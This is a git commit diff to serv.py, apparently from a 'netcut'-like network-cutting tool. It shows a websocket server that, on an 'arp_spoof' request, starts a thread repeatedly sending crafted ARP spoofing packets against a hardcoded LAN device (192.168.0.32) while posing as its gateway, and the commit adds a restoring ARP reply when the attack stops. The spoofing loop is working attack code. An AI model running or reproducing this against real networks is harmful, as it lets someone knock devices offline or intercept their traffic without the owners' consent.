3f919f77ec63604224c569684db195a4e9217985
PashmiDev <lowneonema@gmail.com>
2020-06-23 18:41:56 +0200

    Reset the connection after a cut

--- serv.py
+++ serv.py
@@ -1,15 +1,19 @@
-import asyncio, websockets, json, time
+import asyncio, websockets, json, time, sys
 import netcututils as nc
 import threading
 from scapy.all import *
 #Return an array with every IP of connected devices (on local network)
 
-def doit(arg):
+def doit(target_ip, gateway_ip):
     t = threading.currentThread()
+    packet = nc.craft_arp_spoof(target_ip, gateway_ip)
+
     while getattr(t, "do_run", True):
-        send(arg)
-    print("Stopping as you wish.")
-    # todo remtre la co svp
+        send(packet)
+        time.sleep(1) #Optionnal
+
+    # Reset the network back to its initial state (this is basically a correct ARP packet from a gateway to a target)
+    send(ARP(op = 2, psrc = gateway_ip, hwsrc = getmacbyip(gateway_ip), pdst = target_ip, hwdst = getmacbyip(target_ip)))
 
 async def echo(websocket, path):
     
@@ -23,7 +27,7 @@ async def echo(websocket, path):
         elif request[0] == "arp_spoof":
             # thread.setArp()
             # thread.start()
-            t = threading.Thread(target=doit, args=(nc.craft_arp_spoof("192.168.0.32", "192.168.0.254"),))
+            t = threading.Thread(target=doit, args=("192.168.0.32", "192.168.0.254",))
             t.start()
         elif request[0] == "stop":
             # thread.stop()
